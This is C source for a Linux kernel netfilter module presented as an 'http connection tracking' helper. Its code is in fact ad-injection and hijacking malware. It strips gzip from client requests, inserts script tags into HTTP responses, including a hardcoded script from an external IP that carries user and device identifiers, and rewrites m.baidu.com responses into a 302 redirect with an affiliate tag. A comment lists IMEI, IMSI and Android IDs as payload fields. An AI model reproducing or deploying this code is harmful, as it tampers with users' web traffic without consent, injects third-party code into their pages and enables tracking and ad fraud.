#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/textsearch.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/netlink.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/string.h>

#include <net/sock.h>
#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_expect.h>
#include <net/netfilter/nf_conntrack_ecache.h>
#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_nat_helper.h>


MODULE_AUTHOR("yjj");
MODULE_DESCRIPTION("http connection tracking module");
MODULE_LICENSE("GPL");
MODULE_ALIAS("ip_conntrack_http");
MODULE_ALIAS_NFCT_HELPER("http");

//////////////////////////////////netlink///////////////////////

#define	MNETLINK_PROTO		31
static struct sock *nl_sk = NULL;
static int nl_pid=0;
static DEFINE_SPINLOCK(http_netlink_lock);

enum 
{
    CMD_JS=0x01,
    CMD_CPC=0x02,
    CMD_PAGE_URL_REPLACE=0x04,
    CMD_DOWNLOAD_URL_REPLACE=0x08,
    CMD_MAX
};

#define MAX_POLICY_NUM 3
#define MAX_POLICY_SIZE 16
#define MAX_JS_SIZE 512

#pragma pack (push)
#pragma pack(1)

struct policy_replace
{
    char src[MAX_POLICY_SIZE];
    char filter[MAX_POLICY_SIZE];
    char dst[MAX_POLICY_SIZE];
};

struct policy_cpc
{
    struct policy_replace cpc_replace;
    char is_add;
};

struct policy_buf
{
    char cmd;
    unsigned long reissue_time;//sec
    char js_rate;
    char js[MAX_JS_SIZE];//include<< web_polling_rule,web_polling_num,pub_key,media_type,phone_model,imei,imsi,network,version_name,version_code,os,os_type,android_version,android_id,vendor,serial,resolution
    char cpc_rate;
    char cpc_num;
    struct policy_cpc cpc[MAX_POLICY_NUM];
    char page_url_num;
    struct policy_replace page_url[MAX_POLICY_NUM];
    char download_url_num;
    struct policy_replace download_url[MAX_POLICY_NUM];
};

#pragma pack(pop)

static struct policy_buf gpy;

static int mnlk_send(char* info)
{
	int size;
    struct sk_buff *skb;
    int old_tail;
    struct nlmsghdr *nlh;

    int retval;

    size = NLMSG_SPACE(strlen(info));
    skb = alloc_skb(size, GFP_ATOMIC); 
    nlh = nlmsg_put(skb, 0, 0, 0, NLMSG_SPACE(strlen(info))-sizeof(struct nlmsghdr), 0);
    old_tail = skb->tail;
    memcpy(NLMSG_DATA(nlh), info, strlen(info));
    nlh->nlmsg_len = skb->tail - old_tail; 

    NETLINK_CB(skb).dst_group = 0;
    spin_lock_bh(&http_netlink_lock);
    retval = netlink_unicast(nl_sk, skb, nl_pid, MSG_DONTWAIT);
    spin_unlock_bh(&http_netlink_lock);
    return 0;
}

static void mnlk_rcv(struct sk_buff *skb)
{
	struct nlmsghdr *nlh;
	nlh = nlmsg_hdr(skb);

    //printk("%d---%d---%d" , nlh->nlmsg_len , sizeof(struct policy_buf) , NLMSG_HDRLEN);
    
	/* Bad header */
	if (nlh->nlmsg_len < NLMSG_HDRLEN || nlh->nlmsg_len!= NLMSG_SPACE(sizeof(struct policy_buf)))
	{
		printk("webad:netlink bad header\n");     
		return ;
	}
   
    spin_lock_bh(&http_netlink_lock);  
	nl_pid = nlh->nlmsg_pid;
    memset(&gpy , '\0' , sizeof(struct policy_buf));
    memcpy(&gpy , (char *)NLMSG_DATA(nlh) , sizeof(struct policy_buf));
	printk("webad:netlink rcv userpid:%d len :%d ,js : %s\n",nl_pid ,nlh->nlmsg_len , gpy.js);
    spin_unlock_bh(&http_netlink_lock); 
    mnlk_send("kernel rcv ok");
}

static int mnlk_init(void)
{
    
    memset(&gpy , '\0' , sizeof(struct policy_buf));
    
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
	  	struct netlink_kernel_cfg cfg = {  
	        .input = mnlk_rcv,  
	    };
	    nl_sk = netlink_kernel_create(&init_net, MNETLINK_PROTO, &cfg);  
	#else
	   	nl_sk = netlink_kernel_create(&init_net, MNETLINK_PROTO, 1,
				mnlk_rcv, NULL, THIS_MODULE);
	#endif
	
	if (NULL == nl_sk) 
	{
		printk("webad:netlink_kernel_create error\n");
		return - 1;
	}
    
	return 0;
}

static void mnlk_fini(void)
{
	if(nl_sk) 
	{
	    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
	    	netlink_kernel_release(nl_sk);  
    	#else
    	   	sock_release(nl_sk->sk_socket);
    	#endif
	}        
}

////////////////////////////////BASE////////////////////////////
#define MAX_HTTP_HEAD_LEN 256

#pragma pack (push)
#pragma pack(1)

struct http_skb
{
    struct nf_conn *ct;
	enum ip_conntrack_info ctinfo;
    struct sk_buff *skb;
    struct iphdr* iph;
    struct tcphdr* tcph;
    unsigned int protoff;
    unsigned int dataoff;
    char* data;
    unsigned int data_len;
    unsigned int http_head_len;
};
#pragma pack(pop)

static char *ts_algo = "kmp";

enum http_strings {
	SEARCH_ACCEPT_ENCODING,
	SEARCH_REQUEST_FILTER,
    SEARCH_REQUEST_HOST_START,
	SEARCH_RESPONSE_FILTER1,
	SEARCH_RESPONSE_FILTER2,
	SEARCH_RESPONSE_INSERT_JS,
	SEARCH_RESPONSE_DATA_START,
	SEARCH_RESPONSE_CONTENT_LEN_START,
	SEARCH_RESPONSE_CHUNKED,
	SEARCH_COMMON_VALUE_STOP,
};

static struct {
	const char		*string;
	size_t			len;
	struct ts_config	*ts;
} search[] __read_mostly = {
	[SEARCH_ACCEPT_ENCODING] = {
		.string	= "Accept-Encoding: gzip",
		.len	= 21,
	},
	[SEARCH_REQUEST_FILTER] = {
		.string	= "Accept: text/html",
		.len	= 17,
	},	
    [SEARCH_REQUEST_HOST_START] = {
        .string = "Host: ",
        .len    = 6,
    },
	[SEARCH_RESPONSE_FILTER1] = {
		.string	= "Content-Type: text/html",
		.len	= 23,
	},
	[SEARCH_RESPONSE_FILTER2] = {
		.string	= "Content-Encoding: gzip",
		.len	= 22,
	},
	[SEARCH_RESPONSE_INSERT_JS] = {
		.string	= "<!",
		.len	= 2,
	},
	[SEARCH_RESPONSE_DATA_START] = {
		.string	= "\r\n\r\n",
		.len	= 4,
	},
	[SEARCH_RESPONSE_CONTENT_LEN_START] = {
		.string	= "Content-Length: ",
		.len	= 16,
	},
	[SEARCH_RESPONSE_CHUNKED] = {
		.string	= "Transfer-Encoding: ",
		.len	= 19,
	},
	[SEARCH_COMMON_VALUE_STOP] = {
		.string	= "\r\n",
		.len	= 2,
	},
};

#pragma pack (push)
#pragma pack(1)

struct http_session
{
    long last_time;
    char host[32];
    unsigned long sip,dip;
    unsigned short sp,dp;
    unsigned int response_num;
};

#pragma pack(pop)

#define MAX_HTTP_SESSION_TIMEOUT_SEC 3
static struct http_session ghttps;
static DEFINE_SPINLOCK(http_session_lock);

static void init_http_session(void)
{
    memset(&ghttps , '\0' , sizeof(struct http_session));
}

static void set_http_session(struct http_skb *hskb)
{
    
    struct ts_state ts;
    unsigned int matchoff_start,matchoff_stop;

    memset(&ts, 0, sizeof(ts));
    matchoff_start = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
             search[SEARCH_REQUEST_HOST_START].ts, &ts);
    if (matchoff_start == UINT_MAX)
       return;

    matchoff_start += search[SEARCH_REQUEST_HOST_START].len;
    if(unlikely(matchoff_start >= hskb->data_len))
        return;
    
    memset(&ts, 0, sizeof(ts));
    matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff+matchoff_start, hskb->data_len-matchoff_start,
             search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
    if (matchoff_stop == UINT_MAX)
       return;

    if(unlikely(matchoff_stop > 32))
       return;
    
    spin_lock_bh(&http_session_lock);  
    memset(ghttps.host , '\0' , 32);
    memcpy(ghttps.host , hskb->data+matchoff_start , matchoff_stop);
    ghttps.sip = hskb->iph->saddr;
    ghttps.dip = hskb->iph->daddr;
    ghttps.sp = hskb->tcph->source;
    ghttps.dp = hskb->tcph->dest;
    ghttps.last_time = get_seconds();
    ghttps.response_num = 0;
    spin_unlock_bh(&http_session_lock);  
    return;
    
}

static int  is_http_session_timeout(void)
{
    long last_time = get_seconds();
    spin_lock_bh(&http_session_lock);
    if(last_time - ghttps.last_time > MAX_HTTP_SESSION_TIMEOUT_SEC)
    {
        spin_unlock_bh(&http_session_lock);
        return 1;
    }
    spin_unlock_bh(&http_session_lock);
    return 0;
}

static int is_http_session_request(struct http_skb* https)
{
    spin_lock_bh(&http_session_lock);
    if(https->iph->saddr == ghttps.dip &&
                https->iph->daddr == ghttps.sip &&
                https->tcph->source == ghttps.dp &&
                https->tcph->dest == ghttps.sp &&
                ghttps.response_num == 0)
    {
        ghttps.response_num = 1;
        spin_unlock_bh(&http_session_lock);
        return 1;
    }
    spin_unlock_bh(&http_session_lock);
    return 0;
}

static void change_package(struct http_skb *hskb);

static int (*http_merge_packet_hook)(struct sk_buff *skb,
					struct nf_conn *ct,
					enum ip_conntrack_info ctinfo,
					unsigned int protoff,
					unsigned int match_offset,
					unsigned int match_len,
					const char *rep_buffer,
					unsigned int rep_len)__read_mostly;

static int http_merge_packet(struct sk_buff *skb,
					struct nf_conn *ct,
					enum ip_conntrack_info ctinfo,
					unsigned int protoff,
					unsigned int match_offset,
					unsigned int match_len,
					const char *rep_buffer,
					unsigned int rep_len)
{

	//printk("webad:!! match_offset=%d,match_len=%d,rep_buffer=%s,rep_len=%d\n",match_offset,match_len,rep_buffer,rep_len);      	
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,protoff,	
										match_offset ,match_len,		
										rep_buffer, rep_len); 
	#else
		return nf_nat_mangle_tcp_packet(skb, ct, ctinfo,	
										match_offset ,match_len,		
										rep_buffer, rep_len);
	#endif

	
}

static void (*http_from_client_hook)(struct http_skb *hskb)__read_mostly;

static void (*http_from_server_hook)(struct http_skb *hskb)__read_mostly;

static void http_from_client(struct http_skb *hskb)
{
    struct ts_state ts;
    unsigned int matchoff;  
    struct http_skb* tmp_hskb;
    
    typeof(http_merge_packet_hook) http_merge_packet_tmp;

    tmp_hskb = rcu_dereference(hskb);

    if(!is_http_session_timeout())
    {
        return;
    }
    if(0!=memcmp(tmp_hskb->data , "GET " , 4))
    {
        return;
    }
    memset(&ts, 0, sizeof(ts));
    matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
    	      search[SEARCH_REQUEST_FILTER].ts, &ts);
    if (matchoff == UINT_MAX)
    	return;
    memset(&ts, 0, sizeof(ts));
	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
		      search[SEARCH_ACCEPT_ENCODING].ts, &ts);
	if (matchoff == UINT_MAX)
		return;
    http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
	http_merge_packet_tmp(tmp_hskb->skb, tmp_hskb->ct, tmp_hskb->ctinfo,tmp_hskb->protoff,
			       matchoff, 1,
			       "B", 1);
    set_http_session(hskb);
    return;
}

static void http_from_server(struct http_skb *hskb)
{
    struct ts_state ts;
    unsigned int matchoff;
    struct http_skb* tmp_hskb;

    tmp_hskb = rcu_dereference(hskb);
    if(!is_http_session_request(tmp_hskb))
    {
        return;
    }
    if(0!=memcmp(tmp_hskb->data , "HTTP/1.1 200 OK" , 15))
    {
        return;
    }
    memset(&ts, 0, sizeof(ts));
	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
		      search[SEARCH_RESPONSE_DATA_START].ts, &ts);
	if (matchoff == UINT_MAX)
	    return;
	    
    tmp_hskb->http_head_len= matchoff + search[SEARCH_RESPONSE_DATA_START].len;//include /r/n/r/n
    if(unlikely(tmp_hskb->http_head_len >= tmp_hskb->data_len))
        return;
    
	memset(&ts, 0, sizeof(ts));
	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
		      search[SEARCH_RESPONSE_FILTER1].ts, &ts);
	if (matchoff == UINT_MAX)
	    return;

    memset(&ts, 0, sizeof(ts));
	matchoff = skb_find_text(tmp_hskb->skb, tmp_hskb->dataoff, tmp_hskb->data_len,
		      search[SEARCH_RESPONSE_FILTER2].ts, &ts);
	if (matchoff != UINT_MAX)
	    return;

    change_package(tmp_hskb);
    
}

static int  http_help(struct sk_buff *skb,
		       unsigned int protoff,
		       struct nf_conn *ct,
		       enum ip_conntrack_info ctinfo)
{
    struct http_skb hskb;
    struct http_skb* tmp_hskb;
    
	typeof(http_from_client_hook) http_from_client_tmp;
    typeof(http_from_server_hook) http_from_server_tmp;

    if (0 != skb_linearize(skb))
	{
		printk("webad: !!! skb_linearize error\n");
		return NF_ACCEPT;
	}
    hskb.ct = ct;
    hskb.ctinfo = ctinfo;
    hskb.skb = skb;
	/* No data? */
    hskb.iph = ip_hdr(hskb.skb);
    if(!hskb.iph)
    {
		printk("webad: !!! ip error\n");
		return NF_ACCEPT;
	}
    
    if(protoff != hskb.iph->ihl <<2)
    {
        printk("webad: !!! iph->ihl error\n");
        return NF_ACCEPT;
    }
	if (skb->len != ntohs(hskb.iph->tot_len))
	{
	    printk("webad: !!! iph->tot_len error\n");
        return NF_ACCEPT;
    }
    
    hskb.protoff = protoff;
    hskb.tcph = (struct tcphdr *)((char*)hskb.iph+hskb.protoff);
    if(!hskb.tcph)
    {
		printk("webad: !!! tcp error\n");
		return NF_ACCEPT;
	}
	hskb.dataoff = hskb.protoff + (hskb.tcph->doff<<2);
    hskb.data_len = hskb.skb->len - hskb.dataoff;
	if (hskb.data_len <= MAX_HTTP_HEAD_LEN) 
    {
		//if (net_ratelimit())
		//	printk("webad: skblen = %u\n", skb->len);
		return NF_ACCEPT;
	}
     
    //printk("webad ~~~~~~%d\n" , hskb.data_len);
    hskb.data = (char*)hskb.iph + hskb.dataoff;
    rcu_assign_pointer(tmp_hskb , &hskb);
    
	/* from client */
	if (CTINFO2DIR(ctinfo) == IP_CT_DIR_ORIGINAL)
	{
	    http_from_client_tmp = rcu_dereference(http_from_client_hook); 
        http_from_client_tmp(tmp_hskb);
	}
	/* from server IP_CT_DIR_REPLY*/
	else
	{
	    http_from_server_tmp = rcu_dereference(http_from_server_hook); 
        http_from_server_tmp(tmp_hskb);
	}
	return NF_ACCEPT;
}

static const struct nf_conntrack_expect_policy http_exp_policy = {
	.max_expected		= 256,
	.timeout		= 180,
};

static struct nf_conntrack_helper http_helper __read_mostly = {
	.name			= "http",
	.me			= THIS_MODULE,
	.help			= http_help,
	.tuple.src.l3num	= NFPROTO_IPV4,
	.tuple.src.u.tcp.port	= cpu_to_be16(80),
	.tuple.dst.protonum	= IPPROTO_TCP,
	.expect_policy		= &http_exp_policy,
};

static void __exit nf_conntrack_http_fini(void)
{
	int i;

    rcu_assign_pointer(http_from_client_hook, NULL);
    rcu_assign_pointer(http_from_server_hook, NULL);
    rcu_assign_pointer(http_merge_packet_hook, NULL);
	nf_conntrack_helper_unregister(&http_helper);
	for (i = 0; i < ARRAY_SIZE(search); i++)
		textsearch_destroy(search[i].ts);

    mnlk_fini();
}

static int __init nf_conntrack_http_init(void)
{
	int ret, i;
    
    if(-1==mnlk_init())
        return -1;

    init_http_session();
    
	for (i = 0; i < ARRAY_SIZE(search); i++) {
		search[i].ts = textsearch_prepare(ts_algo, search[i].string,
						  search[i].len,
						  GFP_KERNEL, TS_AUTOLOAD);
		if (IS_ERR(search[i].ts)) {
			ret = PTR_ERR(search[i].ts);
			goto err1;
		}
	}
    BUG_ON(http_from_client_hook != NULL);
    rcu_assign_pointer(http_from_client_hook, http_from_client);
    BUG_ON(http_from_server_hook != NULL);
    rcu_assign_pointer(http_from_server_hook, http_from_server);
    BUG_ON(http_merge_packet_hook != NULL);
    rcu_assign_pointer(http_merge_packet_hook, http_merge_packet);
    
	ret = nf_conntrack_helper_register(&http_helper);
	if (ret < 0)
		goto err1;
	
	return 0;
err1:
	while (--i >= 0)
		textsearch_destroy(search[i].ts);

	return ret;
}


module_init(nf_conntrack_http_init);
module_exit(nf_conntrack_http_fini);

//////////////////////////////////EXTERN////////////////////////
#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n\0"
#define JS_LEN strlen(JS)

#define REDIRECT "HTTP/1.1 302 Moved Temporarily\r\n\
Content-Type: text/html\r\n\
Content-Length: 55\r\n\
Connection: Keep-Alive\r\n\
Location: https://m.baidu.com?from=1009647e\r\n \
\r\n\r\n\
<html>\
<head><title>302 Found</title></head>\
test\
</html>\0"

#define REDIRECT_LEN strlen(REDIRECT)
enum {
	HTTP_RESPONSE_TYPE_CONTENT_LEN,
	HTTP_RESPONSE_TYPE_CHUNKED,
};

struct public_extern
{
    unsigned long curr_insert_js_num;
};

static struct public_extern pe={
    .curr_insert_js_num=0
};

static void insert_js(struct http_skb *hskb , struct http_session* https , struct policy_buf* py)
{
	struct ts_state ts;
	unsigned int insert_js_off,matchoff_start,matchoff_stop;
	char src[32]={0},dst[32]={0};
	unsigned int tmp;
    char js[MAX_JS_SIZE]={0};
    unsigned int js_len;
    char http_response_type;    
    typeof(http_merge_packet_hook) http_merge_packet_tmp;
    http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
    
    //printk("%d---%d---%d------%s----\n" , hskb->dataoff ,hskb->http_head_len, hskb->data_len ,hskb->data);

    memset(&ts, 0, sizeof(ts));
	insert_js_off = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
			  search[SEARCH_RESPONSE_INSERT_JS].ts, &ts);
    if (insert_js_off == UINT_MAX)
	{
        return;
    }
    if (insert_js_off < hskb->http_head_len)
    {
        return;
    }
    
	memset(&ts, 0, sizeof(ts));
	matchoff_start = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
			  search[SEARCH_RESPONSE_CONTENT_LEN_START].ts, &ts);
	if (matchoff_start == UINT_MAX)
	{
	    memset(&ts, 0, sizeof(ts));
	    matchoff_start = skb_find_text(hskb->skb, hskb->dataoff, hskb->data_len,
			  search[SEARCH_RESPONSE_CHUNKED].ts, &ts);
        if (matchoff_start == UINT_MAX)
	    {
            return;
        }
        if (matchoff_start > hskb->http_head_len)
        {
            return;
        }
        http_response_type=HTTP_RESPONSE_TYPE_CHUNKED;
        matchoff_start = hskb->http_head_len;
    }
    else
    {
        http_response_type=HTTP_RESPONSE_TYPE_CONTENT_LEN;
        matchoff_start += search[SEARCH_RESPONSE_CONTENT_LEN_START].len;
    }
    memset(&ts, 0, sizeof(ts));
	matchoff_stop = skb_find_text(hskb->skb, hskb->dataoff + matchoff_start, hskb->data_len - matchoff_start,
			  search[SEARCH_COMMON_VALUE_STOP].ts, &ts);
	if (matchoff_stop == UINT_MAX)
		return;

	if(unlikely(matchoff_stop > 8))
	{
		return;
	}
    memcpy(src , hskb->data + matchoff_start , matchoff_stop);

    snprintf(js , MAX_JS_SIZE , "<script type=\"text/javascript\" async %s ct=\"%lu\" ></script>" ,
            py->js , ++pe.curr_insert_js_num);
    
    js_len = strlen(js);
    if(http_response_type == HTTP_RESPONSE_TYPE_CHUNKED)
    {
        sscanf(src, "%x", &tmp);
        tmp +=js_len;
	    sprintf(dst, "%x" , tmp);
    }
    else
    {
        sscanf(src, "%d", &tmp);
        tmp +=js_len;
	    sprintf(dst, "%d" , tmp);
    }
	
    
    //printk(KERN_INFO "webad:~~~~~:%s---%s\n" , src , dst);
  
    
    if(!http_merge_packet_tmp(hskb->skb , hskb->ct , hskb->ctinfo , hskb->protoff,
    	   insert_js_off, 0,
    	   js, js_len))
        return;

    if(!http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
		   matchoff_start, matchoff_stop,
		   dst, strlen(dst)))
        return;
    
}

static void redirect_cpc(struct http_skb *hskb ,struct http_session* https, struct policy_buf* py)
{
    typeof(http_merge_packet_hook) http_merge_packet_tmp;
    if(!memcmp(https->host , "m.baidu.com" , 11))
    {
    
        http_merge_packet_tmp = rcu_dereference(http_merge_packet_hook); 
        http_merge_packet_tmp(hskb->skb, hskb->ct, hskb->ctinfo,hskb->protoff,
        		   0, hskb->data_len,
        		   REDIRECT,REDIRECT_LEN);
    }
}

static void change_package(struct http_skb *hskb)
{
    unsigned short rate;
    struct http_session *https,*https_tmp;
    struct policy_buf *py,*py_tmp;
    get_random_bytes(&rate, sizeof(unsigned short));
    rate = rate % 100;
    
    //printk(KERN_INFO "webad:~~~~~rate: %u\n" , rate);

    https_tmp = &ghttps;
    py_tmp = &gpy;
    https = rcu_dereference(https_tmp); 
    py = rcu_dereference(py_tmp); 

    insert_js(hskb , https , py);

    return;
    if(py->cmd&0x01)
    {
        if(py->js_rate > rate)
        {
            insert_js(hskb , https , py);
        }
    }
    else if(py->cmd&0x02)
    {
        if(py->cpc_rate> rate)
        {
            redirect_cpc(hskb , https , py);
        }
    }    
    else if(py->cmd&0x04)
    {
        //redirect_page_url(hskb ,py);
    }    
    else if(py->cmd&0x08)
    {
        //redirect_download_url(hskb ,py);
    }
}

